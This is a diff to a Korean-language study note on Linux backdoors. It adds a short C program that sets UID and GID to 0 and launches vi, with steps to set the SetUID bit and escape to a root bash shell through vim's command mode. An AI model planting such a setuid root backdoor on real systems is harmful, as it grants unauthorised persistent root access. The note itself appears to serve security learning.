@@ -15,7 +15,7 @@ uid=1000(test) gid=1000(test) groups=1000(test) context=unconfined_u:unconfined_
 ```
 
 C로 간단한 백도어 만들기
-```
+```c
 #include <stdio.h>
 
 // fun_main
@@ -47,3 +47,18 @@ uid=0(root) gid=0(root) groups=0(root),1000(test) context=unconfined_u:unconfine
 ```
 
 ## vim 명령어 모드를 활용한 백도어
+```c
+#include <stdio.h>
+
+// fun_main
+int main(int argc, char* argv[])
+{
+        setuid(0);      // UID 설정
+        setgid(0);      // GID 설정
+        system("/usr/bin/vi");  // vim 실행
+        return 0;
+}
+```
+- 컴파일 후 SetUIDBit 설정 > 실행
+- 명령 모드에서 (:!/bin/bash)실행
+- vim은 계속 실행 중인 상태로 유지되고 관리자 권한을 가진 상태로 쉘을 사용하게 된다.
